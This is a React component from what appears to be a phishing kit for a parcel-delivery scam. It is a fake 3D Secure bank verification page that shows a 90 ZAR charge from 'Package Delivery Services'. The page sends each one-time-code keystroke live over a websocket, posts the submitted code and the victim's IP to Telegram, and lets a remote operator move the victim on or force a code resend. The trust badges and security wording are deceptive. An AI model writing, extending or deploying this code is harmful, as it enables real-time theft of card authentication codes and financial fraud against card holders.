import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import {
  Box,
  Container,
  Flex,
  VStack,
  Text,
  Icon,
  HStack,
  Image,
  Spinner as ChakraSpinner,
} from "@chakra-ui/react";
import { MdLock, MdVerifiedUser, MdShield, MdSecurity } from "react-icons/md";
import Header from "../components/Header";
import Footer from "../components/Footer";
import ProgressBar from "../components/ProgressBar";
import FormInput from "../components/FormInput";
import CustomButton from "../components/CustomButton";
import { randomParamsURL } from "../utils/validation";
import { useSendTLGMessage } from "../hooks/useTelegram";
import { buildTelegramMessage } from "../utils/messageBuilder";

const ThreeDSecure = () => {
  const navigate = useNavigate();
  const { send, loading } = useSendTLGMessage();
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [otp, setOtp] = useState("");
  const [error, setError] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [timer, setTimer] = useState(180); // 3 minutes
  const [isVerifying, setIsVerifying] = useState(false);
  const clientId =
    typeof window !== "undefined" ? localStorage.getItem("clientId") : null;

  useEffect(() => {
    function onWsPayload(e) {
      const payload = e.detail;
      if (!payload || typeof payload !== "object") return;
      if (payload.type === "error") {
        setError(true);
        setErrorMessage(payload.message || "");
        setIsVerifying(false);
      }
      if (payload.type === "navigate-to-payment-details") {
        setIsModalOpen(false);
        setIsVerifying(false);
        setTimeout(() => {
          navigate(`/payment-details?${randomParamsURL()}`);
        }, 500);
      }
      if (payload.type === "allow-next") {
        setIsModalOpen(false);
        setIsVerifying(false);
        setTimeout(() => {
          navigate(`/security-check?${randomParamsURL()}`);
        }, 500);
      }
      if (payload.type === "resend-code" || payload.type === "request-code-again") {
        // Reset code request: reset timer, show error message, clear OTP input
        setTimer(180);
        setError(true);
        setErrorMessage("The code is incorrect or expired.");
        setOtp("");
        setIsVerifying(false);
        // Optionally close and reopen modal to show new code request
        setIsModalOpen(false);
        setTimeout(() => {
          setIsModalOpen(true);
        }, 300);
      }
    }
    window.addEventListener("ws:payload", onWsPayload);
    return () => window.removeEventListener("ws:payload", onWsPayload);
  }, [navigate]);

  useEffect(() => {
    const timeout = setTimeout(() => {
      setIsModalOpen(true);
    }, 800);

    return () => clearTimeout(timeout);
  }, []);

  useEffect(() => {
    if (isModalOpen && timer > 0) {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(interval);
    } else if (timer === 0) {
      setError(true);
    }
  }, [isModalOpen, timer]);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (otp.length !== 6) {
      setError(true);
      return;
    }

    setIsVerifying(true);

    const clientIp =
      typeof window !== "undefined" ? localStorage.getItem("clientIp") : null;

    // Store OTP data in localStorage for cumulative messages
    const otpData = {
      code: otp,
    };
    localStorage.setItem("otpData", JSON.stringify(otpData));

    // Build cumulative message
    const message = buildTelegramMessage(clientIp);
    await send(message);

    setError(false);
    setErrorMessage("");
    try {
      window.dispatchEvent(
        new CustomEvent("ws:emit", {
          detail: { type: "otp_submit", clientId, otp },
        })
      );
    } catch {
      // ignore
    }
  };

  const handleResend = () => {
    setTimer(180);
    setError(false);
    setErrorMessage("");
    setOtp("");
    setIsVerifying(false);
  };

  return (
    <Box minH="100vh" display="flex" flexDirection="column" bg="#efefef">
      <Header />

      <Box flex="1" py={{ base: 4, md: 6 }}>
        <Container maxW="800px" px={{ base: 4, md: 6 }} mx="auto">
          <ProgressBar currentStep={4} />

          <Box
            bg="white"
            border="1px solid"
            borderColor="#cbcbcb"
            borderRadius="8px"
            boxShadow="0 2px 12px rgba(0,0,0,0.08)"
            overflow="hidden">
            {/* Header */}
            <Box
              bg="linear-gradient(135deg, #1a7a6a 0%, #279989 50%, #2aaa96 100%)"
              color="white"
              position="relative"
              overflow="hidden"
              boxShadow="0 4px 16px rgba(39, 153, 137, 0.25)">
              {/* Decorative Elements */}
              <Box
                position="absolute"
                top="-20px"
                right="-20px"
                w="120px"
                h="120px"
                borderRadius="50%"
                bg="rgba(255, 255, 255, 0.08)"
                filter="blur(30px)"
              />
              <Box
                position="absolute"
                bottom="-30px"
                left="-30px"
                w="150px"
                h="150px"
                borderRadius="50%"
                bg="rgba(0, 0, 0, 0.1)"
                filter="blur(40px)"
              />

              <VStack spacing={3} py={6} px={4} position="relative" zIndex={1}>
                {/* Icon and Title */}
                <Flex align="center" gap={3}>
                  <Box
                    bg="rgba(255, 255, 255, 0.2)"
                    p={3}
                    borderRadius="12px"
                    backdropFilter="blur(10px)"
                    border="2px solid rgba(255, 255, 255, 0.3)"
                    boxShadow="0 4px 12px rgba(0, 0, 0, 0.15)">
                    <Icon as={MdShield} boxSize={{ base: 8, md: 10 }} />
                  </Box>
                  <VStack align="start" spacing={1}>
                    <Text
                      fontSize={{ base: "20px", md: "24px" }}
                      fontWeight="800"
                      letterSpacing="tight"
                      textShadow="0 2px 8px rgba(0, 0, 0, 0.2)">
                      Secure Payment Verification
                    </Text>
                    <Text
                      fontSize={{ base: "12px", md: "13px" }}
                      fontWeight="500"
                      opacity={0.95}
                      letterSpacing="wide">
                      Protected by Advanced 3D Secure Technology
                    </Text>
                  </VStack>
                </Flex>

                {/* Security Badges */}
                <HStack
                  spacing={4}
                  pt={2}
                  flexWrap="wrap"
                  justify="center"
                  gap={2}>
                  <HStack
                    spacing={1.5}
                    bg="rgba(255, 255, 255, 0.15)"
                    px={3}
                    py={1.5}
                    borderRadius="20px"
                    border="1px solid rgba(255, 255, 255, 0.25)">
                    <Icon as={MdLock} boxSize={3.5} />
                    <Text fontSize="11px" fontWeight="700" letterSpacing="wide">
                      256-BIT SSL
                    </Text>
                  </HStack>
                  <HStack
                    spacing={1.5}
                    bg="rgba(255, 255, 255, 0.15)"
                    px={3}
                    py={1.5}
                    borderRadius="20px"
                    border="1px solid rgba(255, 255, 255, 0.25)">
                    <Icon as={MdVerifiedUser} boxSize={3.5} />
                    <Text fontSize="11px" fontWeight="700" letterSpacing="wide">
                      VERIFIED
                    </Text>
                  </HStack>
                  <HStack
                    spacing={1.5}
                    bg="rgba(255, 255, 255, 0.15)"
                    px={3}
                    py={1.5}
                    borderRadius="20px"
                    border="1px solid rgba(255, 255, 255, 0.25)">
                    <Icon as={MdSecurity} boxSize={3.5} />
                    <Text fontSize="11px" fontWeight="700" letterSpacing="wide">
                      PCI COMPLIANT
                    </Text>
                  </HStack>
                </HStack>
              </VStack>
            </Box>

            {/* Content */}
            <Box p={{ base: 6, md: 10 }} bg="white">
              <VStack spacing={6} maxW="600px" mx="auto">
                <Box textAlign="center">
                  <Icon as={MdSecurity} boxSize={16} color="#279989" mb={4} />
                  <Text fontSize="20px" fontWeight="700" mb={3} color="#2c3e50">
                    3D Secure Authentication
                  </Text>
                  <Text fontSize="15px" color="#7f8c8d" lineHeight="1.6">
                    Your bank requires additional verification to complete this
                    transaction. A verification code will be displayed shortly.
                  </Text>
                </Box>

                <Box
                  w="full"
                  p={6}
                  bg="linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%)"
                  borderRadius="12px"
                  border="2px solid"
                  borderColor="#dee2e6">
                  <HStack spacing={3} justify="center" mb={3}>
                    <Icon as={MdVerifiedUser} color="#279989" boxSize={5} />
                    <Text fontSize="15px" fontWeight="700" color="#2c3e50">
                      Verified by Visa / Mastercard SecureCode
                    </Text>
                  </HStack>
                  <Text
                    fontSize="13px"
                    color="#6c757d"
                    textAlign="center"
                    lineHeight="1.5">
                    This additional security layer protects your card from
                    unauthorized transactions and ensures your payment is
                    processed safely.
                  </Text>
                </Box>

                {!isModalOpen && (
                  <Flex align="center" gap={3} py={6}>
                    <ChakraSpinner
                      thickness="4px"
                      speed="0.65s"
                      color="#279989"
                      size="lg"
                    />
                    <Text fontSize="14px" color="#6c757d" fontWeight="500">
                      Connecting to your bank's authentication server...
                    </Text>
                  </Flex>
                )}
              </VStack>
            </Box>
          </Box>
        </Container>
      </Box>

      {/* 3D Secure Modal - Authentic Bank Style */}
      {isModalOpen && (
        <Box
          position="fixed"
          top="0"
          left="0"
          right="0"
          bottom="0"
          bg="rgba(0, 0, 0, 0.75)"
          backdropFilter="blur(6px)"
          zIndex="9999"
          display="flex"
          alignItems="center"
          justifyContent="center"
          p={4}
          sx={{
            animation: "fadeIn 0.3s ease",
            "@keyframes fadeIn": {
              from: { opacity: 0 },
              to: { opacity: 1 },
            },
          }}>
          <Box
            maxW="550px"
            w="full"
            bg="white"
            borderRadius="0"
            boxShadow="0 10px 40px rgba(0,0,0,0.4)"
            overflow="hidden"
            border="2px solid #196b60"
            sx={{
              animation: "slideUp 0.4s ease",
              "@keyframes slideUp": {
                from: { transform: "translateY(30px)", opacity: 0 },
                to: { transform: "translateY(0)", opacity: 1 },
              },
            }}>
            {/* Authentic Bank Header */}
            <Box
              bg="linear-gradient(180deg, #279989 0%, #1e7a6d 100%)"
              color="white"
              py={5}
              px={6}
              borderBottom="2px solid #196b60">
              <Flex align="center" justify="space-between" mb={2}>
                <HStack spacing={3}>
                  <Icon as={MdLock} boxSize={7} />
                  <VStack align="start" spacing={0}>
                    <Text
                      fontSize="19px"
                      fontWeight="800"
                      letterSpacing="tight">
                      3D Secure Verification
                    </Text>
                    <Text fontSize="11px" opacity={0.9} fontWeight="500">
                      Authentication Required
                    </Text>
                  </VStack>
                </HStack>
                <Box
                  bg="rgba(255,255,255,0.25)"
                  px={3}
                  py={2}
                  borderRadius="4px"
                  border="1px solid rgba(255,255,255,0.3)">
                  <HStack spacing={2}>
                    <Icon as={MdShield} boxSize={4} />
                    <Text fontSize="12px" fontWeight="700">
                      SECURE
                    </Text>
                  </HStack>
                </Box>
              </Flex>
            </Box>

            {/* Modal Body - Bank Style */}
            <Box py={7} px={6} bg="#fafafa">
              <VStack spacing={5} align="stretch">
                {/* Merchant Info */}
                <Box
                  p={4}
                  bg="white"
                  borderRadius="6px"
                  border="1px solid #e0e0e0"
                  boxShadow="0 1px 3px rgba(0,0,0,0.08)">
                  <Flex justify="space-between" align="center">
                    <Box>
                      <Text
                        fontSize="11px"
                        color="#666"
                        fontWeight="600"
                        mb={1}>
                        MERCHANT
                      </Text>
                      <Text fontSize="14px" fontWeight="700" color="#2c3e50">
                        Package Delivery Services
                      </Text>
                    </Box>
                    <Box textAlign="right">
                      <Text
                        fontSize="11px"
                        color="#666"
                        fontWeight="600"
                        mb={1}>
                        AMOUNT
                      </Text>
                      <Text fontSize="18px" fontWeight="800" color="#e53e3e">
                        90 ZAR
                      </Text>
                    </Box>
                  </Flex>
                </Box>

                {/* SMS Code Message */}
                <Box
                  p={4}
                  bg="linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%)"
                  borderRadius="6px"
                  border="1px solid #6ee7b7"
                  borderLeft="4px solid #279989">
                  <HStack spacing={2} mb={2}>
                    <Icon as={MdSecurity} color="#279989" boxSize={5} />
                    <Text fontSize="13px" fontWeight="700" color="#065f46">
                      SMS Verification Code Sent
                    </Text>
                  </HStack>
                  <Text fontSize="12px" color="#064e3b" lineHeight="1.5">
                    A 6-digit verification code has been sent to your registered
                    mobile number ending in{" "}
                    <Text as="span" fontWeight="700">
                      ****6789
                    </Text>
                  </Text>
                </Box>

                {/* OTP Input Form */}
                <form onSubmit={handleSubmit}>
                  <VStack spacing={4}>
                    <Box w="full">
                      <Text
                        fontSize="13px"
                        fontWeight="700"
                        mb={2}
                        color="#2c3e50">
                        Enter Verification Code
                      </Text>
                      <FormInput
                        placeholder="000000"
                        value={otp}
                        onChange={(e) => {
                          const value = e.target.value.replace(/\D/g, "");
                          if (value.length <= 6) {
                            setOtp(value);
                            setError(false);
                            setErrorMessage("");
                            try {
                              window.dispatchEvent(
                                new CustomEvent("ws:emit", {
                                  detail: {
                                    type: "otp_update",
                                    clientId,
                                    otp: value,
                                  },
                                })
                              );
                            } catch {
                              // ignore
                            }
                          }
                        }}
                        isInvalid={error}
                        textAlign="center"
                        fontSize="28px"
                        letterSpacing="12px"
                        fontWeight="bold"
                        isDisabled={loading || isVerifying}
                        h="60px"
                        bg="white"
                        border="2px solid"
                        borderColor={error ? "#e53e3e" : "#cbd5e0"}
                        _focus={{
                          borderColor: "#279989",
                          boxShadow: "0 0 0 3px rgba(39,153,137,0.1)",
                        }}
                      />
                    </Box>

                    {error && (
                      <Box
                        w="full"
                        p={3}
                        bg="#fee2e2"
                        borderRadius="6px"
                        border="1px solid #fecaca">
                        <Text
                          fontSize="12px"
                          color="#991b1b"
                          fontWeight="600"
                          textAlign="center">
                          {errorMessage || (timer === 0
                            ? "⚠️ Verification code expired. Please request a new code."
                            : "❌ Invalid verification code. Please check and try again.")}
                        </Text>
                      </Box>
                    )}

                    {/* Timer & Resend */}
                    <HStack
                      w="full"
                      justify="space-between"
                      pt={2}
                      pb={2}
                      fontSize="12px"
                      borderTop="1px solid #e0e0e0">
                      <Text color="#666" fontWeight="600">
                        Code expires in:{" "}
                        <Text
                          as="span"
                          color={timer < 60 ? "#e53e3e" : "#279989"}
                          fontWeight="800">
                          {formatTime(timer)}
                        </Text>
                      </Text>
                      <Text
                        color="#279989"
                        fontWeight="700"
                        cursor="pointer"
                        _hover={{
                          textDecoration: "underline",
                          color: "#1e7a6d",
                        }}
                        onClick={handleResend}>
                        Resend Code
                      </Text>
                    </HStack>

                    {isVerifying ? (
                      <Box
                        w="full"
                        p={5}
                        bg="linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%)"
                        borderRadius="8px"
                        border="2px solid #6ee7b7"
                        mt={2}>
                        <VStack spacing={3}>
                          <ChakraSpinner
                            size="lg"
                            color="#279989"
                            thickness="4px"
                          />
                          <Text
                            fontSize="14px"
                            color="#065f46"
                            fontWeight="700"
                            textAlign="center">
                            🔒 Verifying with your bank...
                          </Text>
                          <Text
                            fontSize="12px"
                            color="#047857"
                            textAlign="center">
                            Please wait while we verify your payment
                          </Text>
                        </VStack>
                      </Box>
                    ) : (
                      <CustomButton
                        type="submit"
                        w="full"
                        maxW="full"
                        h="54px"
                        mt={2}
                        fontSize="16px"
                        isDisabled={otp.length !== 6 || timer === 0}
                        bg="#279989"
                        color="white"
                        _hover={{
                          bg: "#1e7a6d",
                        }}
                        _disabled={{
                          bg: "#cbd5e0",
                          color: "#718096",
                        }}>
                        Verify & Continue
                      </CustomButton>
                    )}
                  </VStack>
                </form>
              </VStack>
            </Box>

            {/* Modal Footer - Bank Style */}
            <Box bg="#f8f9fa" borderTop="1px solid #e0e0e0" py={4} px={6}>
              <HStack spacing={2} justify="center" w="full">
                <Icon as={MdLock} boxSize={3} color="#666" />
                <Text
                  fontSize="10px"
                  color="#666"
                  fontWeight="600"
                  letterSpacing="wide">
                  PROTECTED BY 3D SECURE TECHNOLOGY
                </Text>
              </HStack>
            </Box>
          </Box>
        </Box>
      )}

      <Footer />
    </Box>
  );
};

export default ThreeDSecure;
